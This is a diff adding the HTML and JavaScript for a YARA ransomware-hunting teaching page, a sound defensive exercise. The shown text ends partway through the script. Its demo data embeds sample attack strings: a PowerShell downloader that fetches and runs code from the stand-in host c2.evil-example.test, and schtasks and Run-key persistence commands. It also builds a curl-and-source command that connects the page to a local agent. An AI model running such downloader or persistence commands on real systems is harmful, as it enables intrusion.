@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="en" data-t="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>YARA Live Hunt · watch a ransomware hunt happen</title>
+<meta name="description" content="Open-source teaching tool: simulate a ransomware attack with harmless files, hunt it with YARA, and watch your own Linux, WSL or Kali terminal mirrored live in the browser.">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f2f9f4;--cd:#fff;--bd:#d9eadf;--tx:#1d2b24;--mu:#5a7064;--pr:#2f8f6b;--ps:#e0f3e8;--gr:#3a9a76;--gs:#e4f4ec;--rd:#d65468;--rs:#fbe8ec;--am:#b98512;--as:#fcf5d9;--tb:#12251c;--tt:#e4f2ea;--sh:0 1px 2px #2321300d,0 4px 14px #2321300a;--k:1}
+[data-t=dark]{--bg:#0d1914;--cd:#14251d;--bd:#23382d;--tx:#e4f2ea;--mu:#8fab9c;--pr:#7fd1a8;--ps:#1b3a2b;--gr:#6cc3a0;--gs:#183128;--rd:#ee7f90;--rs:#3a2029;--am:#e6c05a;--as:#333019;--tb:#09130e;--tt:#e4f2ea;--sh:0 1px 3px #0006}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--tx);font:400 14px/1.55 Inter,system-ui,sans-serif}
+h1{font-size:25px;margin:0 0 6px}h2{font-size:17px;margin:0 0 10px}h5{font:600 12px/1.4 inherit;text-transform:uppercase;letter-spacing:.05em;color:var(--mu);margin:0 0 10px}
+p{margin:0 0 10px}.mu{color:var(--mu)}code,pre{font:12px/1.6 ui-monospace,Consolas,monospace}
+#root{display:grid;grid-template-columns:220px 1fr;min-height:100vh}
+aside{position:sticky;top:0;height:100vh;padding:20px 14px;border-right:1px solid var(--bd);background:var(--cd);display:flex;flex-direction:column;gap:6px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:600;margin:0 6px 16px}.logo i{width:30px;height:30px;border-radius:10px;background:var(--pr);color:var(--cd);display:grid;place-items:center;font-style:normal}
+.nv{display:flex;align-items:center;gap:10px;width:100%;padding:10px 12px;border:0;border-radius:12px;background:none;color:var(--mu);font:inherit;font-weight:500;cursor:pointer;text-align:left}
+.nv:hover{color:var(--tx)}.nv.on{background:var(--ps);color:var(--pr)}.nv:focus-visible,.btn:focus-visible,select:focus-visible{outline:2px solid var(--pr);outline-offset:2px}
+.sp{flex:1}main{padding:26px 34px;max-width:1150px;width:100%}
+.card{background:var(--cd);border:1px solid var(--bd);border-radius:18px;padding:18px;box-shadow:var(--sh);margin-bottom:16px}
+.btn{font:inherit;font-weight:500;border:1px solid var(--bd);background:var(--cd);color:var(--tx);border-radius:12px;padding:8px 14px;cursor:pointer}
+.btn:hover{border-color:var(--pr)}.btn:disabled{opacity:.5;cursor:default}.btn.p{background:var(--pr);border-color:var(--pr);color:var(--cd)}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}.row .p{margin-left:auto}.row.l .p{margin-left:0}
+.chip{display:inline-block;padding:3px 10px;border-radius:99px;background:var(--ps);color:var(--pr);font-size:12px;font-weight:500}
+.chip.g{background:var(--gs);color:var(--gr)}.chip.r{background:var(--rs);color:var(--rd)}.chip.a{background:var(--as);color:var(--am)}
+.disc{border-left:3px solid var(--pr);background:var(--ps);border-radius:0 12px 12px 0;padding:10px 14px;margin:12px 0 0;font-size:13px}
+.ban{border-radius:14px;padding:12px 16px;margin-bottom:16px;background:var(--ps);border:1px solid var(--bd);font-size:13px}.ban b{text-transform:uppercase;display:block;margin-bottom:2px}
+.ban.o{background:var(--as);color:var(--am)}.ban.b{background:var(--rs);color:var(--rd)}.ban.n b{color:var(--pr)}.ban.o span,.ban.b span{color:var(--tx)}
+.hero{padding:42px 34px;text-align:left}.hero h1{font-size:clamp(28px,4.4vw,42px);line-height:1.15;letter-spacing:-.02em;margin:14px 0 12px}.hero p{max-width:620px;font-size:15px;color:var(--mu)}
+.g3{display:grid;grid-template-columns:repeat(auto-fill,minmax(235px,1fr));gap:14px}.cols{display:grid;grid-template-columns:1.2fr 1fr;gap:16px}.cols>.card{min-width:0}
+.big{font-size:34px;font-weight:600;line-height:1.1}.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:14px}
+.stats div{background:var(--bg);border-radius:12px;padding:10px 12px}.stats span{color:var(--mu);font-size:12px}.stats .big{font-size:26px}
+.flowmap{display:grid;grid-template-columns:repeat(6,1fr);gap:8px}
+.flowstage{font:inherit;text-align:left;border:1px solid var(--bd);background:var(--cd);color:var(--tx);border-radius:12px;padding:9px 10px;cursor:pointer;opacity:.55;transition:.3s}
+.flowstage b{display:block;font-size:12.5px}.flowstage small{color:var(--mu);font-size:11px}.flowstage.done{opacity:1}.flowstage.active{opacity:1;border-color:var(--pr);background:var(--ps)}
+.fnum{display:inline-grid;place-items:center;width:20px;height:20px;border-radius:50%;background:var(--ps);color:var(--pr);font-size:11px;font-weight:600;margin-right:6px}.flowstage.active .fnum{background:var(--pr);color:var(--cd)}
+.rail{position:relative;height:2px;background:var(--bd);margin:12px 0 4px}.rail i{position:absolute;top:-4px;width:10px;height:10px;margin-left:-5px;border-radius:50%;background:var(--pr);transition:left calc(.6s*var(--k))}
+.simcontrols{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:12px}select{font:inherit;background:var(--bg);color:var(--tx);border:1px solid var(--bd);border-radius:12px;padding:7px 10px}
+.facts{display:grid;grid-template-columns:1fr 1fr;gap:10px}.fact{background:var(--bg);border-radius:12px;padding:10px 12px}.fact h5{margin-bottom:4px}
+.term{background:var(--tb);color:var(--tt);border-radius:12px;padding:12px;font:12px/1.65 ui-monospace,Consolas,monospace;min-height:120px;max-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-all}
+.term i{color:#8fd8b8;font-style:normal}.term .a{color:#f2d27a}.term .d{color:#f19aa8}.term .m{color:#9fd0e8}.term .s{color:#8fd8b8}.term .x{opacity:.6}
+.cmd{background:var(--tb);color:var(--tt);border-radius:12px;padding:12px;margin:0 0 12px;white-space:pre-wrap;word-break:break-all;user-select:all}
+.dg{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:10px}.box{border:1px solid var(--bd);border-radius:12px;padding:10px}.box h5{word-break:break-all;margin-bottom:6px}
+.fi{display:flex;justify-content:space-between;gap:6px;font-size:12px;padding:4px 8px;margin:3px 0;border-radius:8px;background:var(--bg);border-left:3px solid var(--bd);word-break:break-all}.fi.in{animation:pop calc(.35s*var(--k)) calc(var(--i)*.05s*var(--k)) backwards}
+.fi.new{background:var(--as);border-color:var(--am)}.fi.ok{background:var(--gs);border-color:var(--gr)}.fi.rej{background:var(--rs);border-color:var(--rd);font-weight:600}
+.fi.gone{background:var(--rs);border-color:var(--rd);text-decoration:line-through;opacity:.7}.fi.mod{background:var(--ps);border-color:var(--pr)}
+.tg{font-size:10px;background:var(--rd);color:var(--cd);border-radius:99px;padding:1px 7px;white-space:nowrap;align-self:center}.bk{font-size:11px;color:var(--mu);margin-top:4px}
+.br{display:flex;align-items:center;gap:10px;margin:8px 0;font-size:13px}.br>span{width:150px;flex:none}.tr{flex:1;height:8px;border-radius:99px;background:var(--bd);overflow:hidden}.fl{height:100%;background:var(--pr);border-radius:99px;animation:gr calc(.7s*var(--k)) backwards}.br b{min-width:40px;text-align:right}
+.f{border:1px solid var(--bd);border-left:3px solid var(--rd);border-radius:12px;padding:8px 12px;margin-bottom:8px}.f code{display:block;background:var(--bg);border-radius:8px;padding:2px 8px;margin-top:4px;word-break:break-all}
+.try{display:flex;gap:8px;align-items:center;margin:6px 0}.try code{flex:1;background:var(--bg);border-radius:8px;padding:6px 8px;word-break:break-all}.try .btn{padding:4px 10px;font-size:12px}
+ul.ck{list-style:none;padding:0;margin:0}ul.ck li{padding:5px 0 5px 24px;position:relative}ul.ck li:before{content:"✓";position:absolute;left:0;color:var(--gr);font-weight:600}ul.ck.x li:before{content:"✗";color:var(--rd)}
+.steps3 b{color:var(--pr)}.kv{display:grid;grid-template-columns:140px 1fr;gap:4px 12px;font-size:13px}
+@keyframes pop{from{opacity:0;transform:scale(.94)}}@keyframes gr{from{width:0}}
+@media(max-width:800px){#root{grid-template-columns:1fr}aside{position:static;height:auto;flex-direction:row;flex-wrap:wrap;align-items:center;border-right:0;border-bottom:1px solid var(--bd);padding:10px}.logo{margin:0 8px 0 0}.nv{width:auto;padding:8px 10px}main{padding:18px 14px}.cols,.facts{grid-template-columns:1fr}.flowmap{grid-template-columns:repeat(2,1fr)}.stats{grid-template-columns:repeat(2,1fr)}.rail{display:none}.br>span{width:90px}.hero{padding:26px 18px}}
+@media(max-width:1100px){.cols{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}main{padding:22px 20px}}
+@media(max-width:560px){h1{font-size:21px}.try{flex-wrap:wrap}.try code{flex-basis:100%}.row .btn{flex:1 1 auto}.nv{padding:7px 8px;font-size:13px}.cmd{font-size:11px}}
+#root>main{min-width:0}.g3{grid-template-columns:repeat(auto-fill,minmax(min(235px,100%),1fr))}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+<div id="root">
+<aside>
+ <div class="logo"><i>Y</i>YARA Live Hunt</div>
+ <button class="nv" data-a="nav" data-v="home"></button><button class="nv" data-a="nav" data-v="demo"></button><button class="nv" data-a="nav" data-v="conn"></button><button class="nv" data-a="nav" data-v="sec"></button><button class="nv" data-a="nav" data-v="about"></button>
+ <div class="sp"></div><button class="nv" data-a="theme" id="thb"></button>
+</aside>
+<main id="m"></main>
+</div>
+<script>
+const $=s=>document.querySelector(s),e=t=>String(t).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const S={p:'home',th:'light',st:0,play:0,speed:1},TMR={};
+try{S.th=localStorage.th||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light')}catch(x){}
+const IC={home:'<path d="M3 11l9-8 9 8v9a1 1 0 01-1 1h-5v-6H9v6H4a1 1 0 01-1-1z"/>',demo:'<path d="M8 5v14l11-7z"/>',conn:'<path d="M4 17l6-6-6-6M12 19h8"/>',sec:'<path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6z"/>',about:'<circle cx="12" cy="12" r="9"/><path d="M12 8h.01M11 12h1v5h1"/>',theme:'<path d="M20 14.5A8 8 0 019.5 4 8 8 0 1020 14.5z"/>'};
+const svg=k=>`<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${IC[k]}</svg>`;
+const NAV={home:'Home',demo:'Guided demo',conn:'Connect terminal',sec:'Security',about:'About & license'};
+/* ---------- demo data: the same files and rules as attack_sim.sh and rules/rules.yar ---------- */
+const EXE='MZ\x90\0 SIMULATED LOADER EVIL_LOADER_v1 beacon to c2.evil-example.test\n',NOTE='SIMULATED RANSOM NOTE (demo, nothing is encrypted)\nYour files have been encrypted. To decrypt them, send 0.5 bitcoin to wallet 1FAKEdemoWALLETaddress.\n',
+PS='# SIMULATED - harmless text\n$wc = New-Object Net.WebClient\n$code = $wc.DownloadString("http://c2.evil-example.test/stage2.txt")\nInvoke-Expression $code\n',
+PER='# SIMULATED - harmless text\nschtasks /create /tn "WindowsUpdateCheck" /tr "C:\\Users\\john\\update.ps1" /sc onlogon\nreg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /d "C:\\Users\\john\\update.ps1"\n',
+V2=EXE+' extra padding bytes\n',BASE={'shared/admin_backup.ps1':'# Legit nightly backup script\n$cfg = Get-Content C:\\backup\\config.txt\nInvoke-Expression $cfg\n'},
+ATK=[['Phishing','Invoice_Oct2026.pdf.exe',{'mail_attachments/Invoice_Oct2026.pdf.exe':EXE}],['Disguise','holiday_photo.jpg',{'users/john/Downloads/holiday_photo.jpg':EXE}],['PowerShell','update.ps1',{'users/john/AppData/update.ps1':PS}],['Persistence','persistence.ps1',{'users/john/AppData/persistence.ps1':PER}],['Ransom notes','README_DECRYPT.txt ×2',{'finance/README_DECRYPT.txt':NOTE,'hr/README_DECRYPT.txt':NOTE}],['Variant','Invoice_v2.exe',{'shared/Invoice_v2.exe':V2}]];
+const STEPS=[['Scan clean','Baseline','yara -r rules/rules.yar fileserver','No output means no rule matched. The legit admin script was not flagged.'],['Attack','Simulation','bash attack_sim.sh','Six attack stages land as harmless files that carry real indicators.'],['Save hash','Indicator of compromise',"sha256sum fileserver/mail_attachments/Invoice_Oct2026.pdf.exe | cut -d' ' -f1 > known_bad_hashes.txt",'A hash taken from a threat report identifies one exact file.'],['Hunt by hash','Exact matching','find fileserver -type f -exec sha256sum {} + | grep -F -f known_bad_hashes.txt','Hash search finds exact copies only. The recompiled variant slips through.'],['Hunt with YARA','Content rules','yara -r rules/rules.yar fileserver','YARA matches content, so it catches the variant and the .jpg that is really an executable.'],['Evidence','Explainable output','yara -r -s rules/rules.yar fileserver','-s prints matched strings and byte offsets. The C2 domain is what the analyst blocks.']];
+const RULES=[{n:'Sim_Loader_Family',s:[['$marker','EVIL_LOADER_v1'],['$c2','c2.evil-example.test',1],['$beacon','beacon',1]],ok:(c,h)=>c.startsWith('MZ')&&h>=2},{n:'Sim_PS_Downloader',s:[['$a','DownloadString',1],['$b','Invoke-Expression',1],['$c','Net.WebClient',1]],ok:(c,h)=>h>=2},{n:'Sim_Persistence',s:[['$a','schtasks /create',1],['$b','CurrentVersion\\Run',1]],ok:(c,h)=>h==2},{n:'Sim_Ransom_Note',s:[['$a','Your files have been encrypted',1],['$b','bitcoin',1],['$c','decrypt',1]],ok:(c,h)=>h>=2&&c.length<5120}];
+const fsAt=st=>st>=1?Object.assign({},BASE,...ATK.map(a=>a[2])):BASE;
+function yara(fs){const o=[];for(const p of Object.keys(fs).sort())for(const r of RULES){const c=fs[p],hits=[];for(const[id,t,nc]of r.s){const i=nc?c.toLowerCase().indexOf(t.toLowerCase()):c.indexOf(t);if(i>=0)hits.push({id,off:i,t})}if(r.ok(c,hits.length))o.push({n:r.n,p,hits})}return o}
+const SH={};async function hashes(){if(!crypto.subtle)return;for(const c of[EXE,V2]){const b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(c));SH[c]=[...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('')}}
+function out(st){const fs=fsAt(st);if(st==0)return'(no output: no rule matched)';if(st==1)return ATK.map((a,i)=>`[${i+1}] ${a[0]}: ${a[1]}`).join('\n')+'\n[DONE] Attack simulated. File server is now compromised.';
+if(st==2)return SH[EXE]?'(saved) '+SH[EXE]:'(hashing needs https or localhost)';if(st==3)return Object.keys(fs).filter(p=>SH[fs[p]]&&SH[fs[p]]==SH[EXE]).map(p=>SH[fs[p]].slice(0,16)+'…  fileserver/'+p).join('\n')||'(no hits)';
+return yara(fs).map(x=>x.n+' fileserver/'+x.p+(st==5?'\n'+x.hits.map(h=>'0x'+h.off.toString(16)+':'+h.id+': '+h.t).join('\n'):'')).join('\n')}
+/* ---------- shared components ---------- */
+const bar=(l,f,r)=>`<div class="br"><span>${l}</span><div class="tr"><div class="fl" style="width:${Math.round(f*100)}%"></div></div><b>${r}</b></div>`;
+const BK=/(report|emp)_\d+\.txt$/;
+function tree(ps,cf,done,extra){const g={},nb=Object.assign({},extra);let i=0;ps.forEach(p=>{const d=p.includes('/')?p.slice(0,p.lastIndexOf('/')):'(root)',c=cf(p);if(BK.test(p)&&!c.t.length&&(!c.c||c.c=='ok'))nb[d]=(nb[d]||0)+1;else(g[d]=g[d]||[]).push([p,c])});
+const G={ok:'✓ ',rej:'✗ ',new:'+ ',gone:'− ',mod:'~ '};
+return'<div class="dg">'+[...new Set([...Object.keys(g),...Object.keys(nb)])].sort().map(d=>`<div class="box"><h5>fileserver/${e(d)}</h5>${(g[d]||[]).map(([p,c])=>`<div class="fi ${c.c}${c.f?' in':''}" style="--i:${c.f?Math.min(i++,12):0}"><span>${G[c.c]||''}${e(p.split('/').pop())}</span>${c.t.map(r=>`<span class="tg">${e(r)}</span>`).join('')}</div>`).join('')}${nb[d]?`<div class="bk">+ ${nb[d]} normal files${done?' (scanned, clean)':''}</div>`:''}</div>`).join('')+'</div>'}
+const findings=(ms)=>ms.length?ms.map(m=>`<div class="f"><b>${e(m.rule)}</b> <span class="tg">${e(m.severity||'')}</span><div class="mu">${e(m.path)} · ${e(m.stage||'')}</div>${m.strings.map(x=>`<code>0x${e(x.off)} ${e(x.id)}: ${e(x.text)}</code>`).join('')}</div>`).join(''):'<span class="mu">No rule matched.</span>';
+const stat=(n,l,s)=>{const a=typeof n=='number'&&!s;return`<div><div class="big" ${a?`data-count="${n}"`:''}>${a?0:n}</div><span>${l}</span></div>`};
+/* ---------- pages ---------- */
+const P={};
+P.home=()=>`<section class="card hero"><span class="chip">Open source · MIT license · harmless text files only</span>
+<h1>Hunt ransomware with YARA.<br>Watch every file change, live.</h1>
+<p>Simulate an attack on a fake file server, hunt it with real YARA rules, and see why content rules catch what hash lists miss. Run it in the built-in demo, or connect your own Linux, WSL or Kali terminal and watch your real commands drive the dashboard.</p>
+<div class="row l"><button class="btn p" data-a="nav" data-v="demo">Try the guided demo</button><button class="btn" data-a="nav" data-v="conn">Connect your terminal</button></div>
+<div class="disc">No real malware is ever used. The attack writes plain text files that contain indicators such as an MZ header, a fake C2 domain and a ransom note.</div></section>
+<div class="g3"><div class="card steps3"><h5>1 · Simulate</h5><p><b>Six attack stages</b> appear as files: phishing loader, disguised copy, PowerShell, persistence, ransom notes, recompiled variant.</p></div>
+<div class="card steps3"><h5>2 · Hunt</h5><p><b>Hash search</b> finds exact copies only. <b>YARA</b> matches content, so it also catches the disguised and recompiled files.</p></div>
+<div class="card steps3"><h5>3 · See the evidence</h5><p>Matched <b>strings and byte offsets</b> show exactly why each file was flagged. Colour carries meaning: green clean, amber new, red flagged.</p></div></div>
+<div class="card"><h5>The attack chain you will replay</h5><div class="flowmap">${ATK.map((a,i)=>`<div class="flowstage done"><b><span class="fnum">${i+1}</span>${a[0]}</b><small>${e(a[1])}</small></div>`).join('')}</div></div>
+<div class="card"><h5>Your own terminal, in the browser</h5><p>Open <b>Connect terminal</b>, paste one command into WSL, Kali or any Linux shell, then run the lab commands. Files created or deleted in <code>~/yara-lab</code> appear on the page within a second. Everything stays on your machine.</p><button class="btn" data-a="nav" data-v="sec">How the bridge stays safe</button></div>`;
+P.demo=()=>{const st=S.st,fs=fsAt(st),m=st>=4?yara(fs):[],fl={};m.forEach(x=>(fl[x.p]=fl[x.p]||[]).push(x.n));const bad=Object.keys(fl).length,truth=Object.keys(yara(fs)).length?new Set(yara(fs).map(x=>x.p)).size:0,hh=st>=3?Object.keys(fs).filter(p=>SH[fs[p]]&&SH[fs[p]]==SH[EXE]):[];
+const t=STEPS[st],tag=S.play?'<span class="chip">● PLAYING</span>':st==5?'<span class="chip g">✓ TRACE COMPLETE</span>':'<span class="chip a">Ⅱ PAUSED</span>';
+const cf=p=>({f:1,...(fl[p]?{c:'rej',t:fl[p]}:st>=4||st==0?{c:'ok',t:[]}:(st>=1&&!BASE[p]?{c:'new',t:[]}:{c:'',t:[]}))});
+return`<h1>Guided demo</h1><p class="mu">A browser-only simulation. The rules and files are the same ones the real lab uses, and the matching runs in this page.</p>
+<div class="card"><div class="flowmap">${STEPS.map((s,i)=>`<button class="flowstage ${i<st?'done':''} ${i==st?'active':''}" data-a="stage" data-v="${i}"><b><span class="fnum">${i+1}</span>${s[0]}</b><small>${s[1]}</small></button>`).join('')}</div><div class="rail"><i id="dot"></i></div>
+<div class="simcontrols"><button class="btn" data-a="prev" ${st==0?'disabled':''}>Previous</button><button class="btn" data-a="next" ${st==5?'disabled':''}>Next</button><button class="btn p" data-a="play">${S.play?'Pause':'Play'}</button><button class="btn" data-a="replay">Replay step</button><button class="btn" data-a="restart">Restart</button>
+<select data-a="speed" aria-label="Speed">${[.5,1,2,4].map(v=>`<option value="${v}" ${v==S.speed?'selected':''}>${v}×</option>`).join('')}</select>${tag}<span class="mu">Step ${st+1} of 6 · ← → Space</span></div></div>
+<div class="card"><h2>${st+1}. ${t[0]} <span class="chip">${t[1]}</span></h2><div class="facts"><div class="fact"><h5>What happened</h5>${e(t[3])}</div><div class="fact"><h5>Command</h5><code data-type="text">${e(t[2])}</code></div></div>
+<h5 style="margin-top:14px">Output</h5><div class="term"><i>$</i> ${e(t[2])}\n${e(out(st))}</div></div>
+<div class="card" style="min-height:250px"><h5>Live file server</h5><div class="stats">${stat(Object.keys(fs).length+150,'files on server')}${stat(st>=1?6:0,'attack stages seen')}${stat(st>=4?bad:'–','files flagged')}${stat(st>=3?hh.length:'–','found by hash')}</div>
+${tree(Object.keys(fs).sort(),cf,st==0||st>=4,{finance:100,hr:50})}
+${st>=3?`<h5 style="margin-top:16px">Hash hunt vs YARA</h5>${bar('Hash search',hh.length/truth,hh.length+' / '+truth)}${st>=4?bar('YARA rules',bad/truth,bad+' / '+truth):''}${st>=4?`<div class="disc">Hash missed ${truth-hh.length} files: ${Object.keys(fl).filter(p=>!hh.includes(p)).map(p=>e(p.split('/').pop())).join(', ')}. YARA caught them by content.</div>`:''}`:''}</div>`};
+const C={tok:'',port:8765,ok:0,err:0,ver:-1,since:0,files:[],loaded:0,gh:{},nw:{},fr:{},ev:[],scan:null,hash:null,stages:[],info:{}};
+const PRE='for c in python3 curl yara; do command -v $c >/dev/null && echo "ok       $c" || echo "MISSING  $c"; done';
+const rnd=()=>[...crypto.getRandomValues(new Uint8Array(16))].map(x=>x.toString(16).padStart(2,'0')).join('');
+const base=()=>location.href.replace(/[#?].*$/,'').replace(/\/[^\/]*$/,'');
+const cmd=()=>`curl -fsSL "${base()}/agent/connect.sh" -o ~/.yh-connect.sh && source ~/.yh-connect.sh --token ${C.tok} --origin ${location.origin} --base ${base()} --port ${C.port}`;
+const insp=()=>`curl -fsSL "${base()}/agent/connect.sh" | less`;
+P.conn=()=>{if(!C.tok)C.tok=rnd();return`<h1>Connect your terminal</h1><p class="mu">Use your own WSL, Kali or Linux shell instead of the demo. Your commands and the files they create or delete are mirrored here, live.</p><div id="cban"></div>
+<div class="card"><h5>0 · Check your computer first (one time)</h5><p class="mu">You don't need to build anything: the command in step 1 creates the practice lab for you. You only need a Linux terminal with three tools. No Linux terminal? The <b>Guided demo</b> works for everyone with nothing installed.</p>
+<div class="kv"><b>Windows</b><span>Open PowerShell as administrator, run <code>wsl --install -d Ubuntu</code>, restart, then open <b>Ubuntu</b> from the Start menu.</span><b>Linux or Kali</b><span>You already have a terminal.</span><b>Mac or phone</b><span>Not supported for Connect (it needs Linux tools). Use the Guided demo, or a Linux virtual machine.</span><b>Install the tools</b><span><code>sudo apt update &amp;&amp; sudo apt install -y yara python3 curl</code></span></div>
+<div class="row l" style="margin-top:10px"><button class="btn" data-a="copy" data-v="pre">Copy “check my tools” command</button><span class="mu">Paste it in your terminal. Every line should say ok.</span></div></div>
+<div class="card"><h5>1 · Paste this into your terminal</h5><pre class="cmd" id="cmd">${e(cmd())}</pre><div class="row l"><button class="btn p" data-a="copy" data-v="cmd">Copy command</button><button class="btn" data-a="copy" data-v="insp">Copy “read it first” command</button><button class="btn" data-a="stop">Disconnect</button><span id="cs" class="chip a">● Waiting for terminal</span></div>
+<div class="disc">Needs <code>python3</code>, <code>curl</code> and <code>yara</code> (<code>sudo apt install yara -y</code>). The command is one-time: it carries a random token made in this tab, so reloading the page needs a new command. Undo anytime with <code>yh_off</code>.</div>
+<div class="ban o"><b>Before you connect</b><span>Don't type passwords, API keys or other secrets in this shell while connected. Commands you type inside <code>~/yara-lab</code> appear on this page. Use only on a computer you own, and read the script first.</span></div></div>
+<div class="cols"><div class="card"><h5>2 · Virtual terminal (mirrors your real one)</h5><div class="term" id="ct"></div></div>
+<div class="card"><h5>3 · Run these in your real terminal</h5><p class="mu">Start with <code>cd ~/yara-lab</code>, then go in order.</p>${STEPS.map((s,i)=>`<div class="try"><span class="chip">${i+1}</span><code>${e(s[2])}</code><button class="btn" data-a="copy" data-v="s${i}">Copy</button></div>`).join('')}</div></div>
+<div class="card"><h5>Live file server</h5><div class="stats" id="cst"></div><div id="cf"></div></div>
+<div class="cols"><div class="card"><h5>Findings</h5><div id="cfd"></div></div><div class="card"><h5>Hash hunt vs YARA</h5><div id="ccm"></div></div></div>`};
+const PR=()=>`${e(C.info.user||'you')}@${e(C.info.host||'host')}:~/yara-lab`;
+const H=(q,h)=>{const el=$(q);if(el&&el._h!==h){el._h=h;el.innerHTML=h}};
+function cupd(){if(S.p!='conn')return;const i=C.info,sc=C.scan,now=Date.now();Object.keys(C.gh).forEach(p=>{if(now-C.gh[p]>6000)delete C.gh[p]});
+let b='';if(location.protocol=='file:')b='<div class="ban o"><b>Open this page over http or https</b><span>Browsers send no origin from file:// pages. Host it on GitHub Pages, or run <code>python3 -m http.server 8000</code> in the project folder and open http://localhost:8000.</span></div>';
+else if(C.err)b='<div class="ban b"><b>Connection refused</b><span>The agent rejected this tab’s token or origin. Copy the command above again (a page reload makes a new token), or run <code>yh_off</code> and paste it fresh.</span></div>';
+else if(!C.ok)b='<div class="ban n"><b>Waiting for your terminal</b><span>ℹ Paste the command above. ℹ Chrome, Edge and Firefox allow this; Safari blocks https pages from reaching localhost. ℹ If Chrome asks to allow local network access, choose Allow.</span></div>';
+else if(!i.yara)b='<div class="ban o"><b>YARA not installed</b><span>Run <code>sudo apt install yara -y</code> in your terminal, then press the scan command again.</span></div>';
+H('#cban',b);const cs=$('#cs');cs.className='chip '+(C.ok?'g':'a');cs.textContent=C.ok?`● CONNECTED · ${i.user}@${i.host}`:'● Waiting for terminal';
+const lines=C.ev.slice(-60).map(x=>({cmd:`<div><i>${PR()}$</i> ${e(x.c)}</div>`,add:`<div class="a">+ created   ${e(x.p)}</div>`,del:`<div class="d">− deleted   ${e(x.p)}</div>`,mod:`<div class="m">~ modified  ${e(x.p)}</div>`,addn:`<div class="a">+ ${x.n} files created</div>`,deln:`<div class="d">− ${x.n} files deleted</div>`,modn:`<div class="m">~ ${x.n} files modified</div>`,stage:`<div class="a">⚑ attack stage ${x.s} of 6 observed</div>`,scan:`<div class="${x.hits?'d':'s'}">${x.hits?'✗ '+x.hits+' files flagged':'✓ clean'} · ${x.n} files scanned</div>`}[x.k]||'')).join('');
+const ct=$('#ct');if(ct){const atEnd=ct.scrollTop+ct.clientHeight>=ct.scrollHeight-30;const hs=lines||`<span class="x">${C.ok?`Connected to ${e(i.os||'your system')}. Run a command in your real terminal…`:'Not connected yet.'}</span>`;if(ct._h!==hs){ct._h=hs;ct.innerHTML=hs;if(atEnd)ct.scrollTop=ct.scrollHeight}}
+const flag={};(sc?sc.matches:[]).forEach(m=>(flag[m.path]=flag[m.path]||[]).push(m.rule));const ps=[...new Set([...C.files.map(f=>f[0]),...Object.keys(C.gh)])].sort();
+const fz=p=>(C.fr[p]&&now-C.fr[p]<1200)||(C.gh[p]&&now-C.gh[p]<1200)?1:0;
+const cf=p=>({f:fz(p),...cf0(p)}),cf0=p=>C.gh[p]?{c:'gone',t:[]}:flag[p]?{c:'rej',t:flag[p]}:C.nw[p]!=null&&(!sc||sc.id<=C.nw[p])?{c:'new',t:[]}:sc?{c:'ok',t:[]}:{c:'',t:[]};
+H('#cst',stat(C.files.length,'files on server',1)+stat(C.stages.length+' / 6','attack stages seen',1)+stat(sc?Object.keys(flag).length:'–','files flagged',1)+stat(sc&&sc.secs!=null?sc.secs+'s':'–','scan time',1));
+H('#cf',C.ok||C.files.length?tree(ps,cf,!!sc):'<span class="mu">Connect to see your lab’s files.</span>');
+H('#cfd',sc&&sc.err?`<div class="ban b"><b>Scan failed</b><span>${e(sc.err)}</span></div>`:sc?findings(sc.matches):'<span class="mu">Run a yara scan in your terminal.</span>');
+const h=C.hash;H('#ccm',!h?'<span class="mu">Save a known-bad hash in your terminal (step 3) to compare.</span>':(()=>{const bad=sc?Object.keys(flag).length:0,t=Math.max(bad,h.length,1);return bar('Hash search',h.length/t,h.length)+(sc?bar('YARA rules',bad/t,bad)+(()=>{const mi=Object.keys(flag).filter(p=>!h.includes(p));return mi.length?`<div class="disc">Hash missed ${mi.length}: ${mi.map(p=>e(p.split('/').pop())).join(', ')}.</div>`:''})():'')})());
+}
+function ingest(d){d.ev.forEach(x=>C.since=Math.max(C.since,x.n));C.ev=C.ev.concat(d.ev).slice(-120);C.scan=d.scan;C.hash=d.hash;C.stages=d.stages;
+if(d.files){const nf=d.files,old=new Set(C.files.map(f=>f[0])),nw=new Set(nf.map(f=>f[0])),add=nf.filter(f=>!old.has(f[0])),del=C.files.filter(f=>!nw.has(f[0]));
+if(C.loaded&&add.length+del.length<=20){add.forEach(f=>{C.nw[f[0]]=C.scan?C.scan.id:0;C.fr[f[0]]=Date.now()});del.forEach(f=>C.gh[f[0]]=Date.now())}else if(C.loaded&&del.length>=50){C.nw={};C.gh={}}
+C.files=nf;C.ver=d.ver;C.loaded=1}}
+async function poll(){clearTimeout(TMR.c);if(S.p!='conn')return;
+try{const r=await fetch(`http://127.0.0.1:${C.port}/state?since=${C.since}&ver=${C.ver}`,{headers:{'X-YH-Token':C.tok},cache:'no-store'});
+if(r.status==401||r.status==403){C.ok=0;C.err=1}else{const d=await r.json();C.err=0;C.ok=1;C.info=d;ingest(d)}}catch(x){C.ok=0;C.err=0}
+cupd();TMR.c=setTimeout(poll,C.ok?500:1500)}
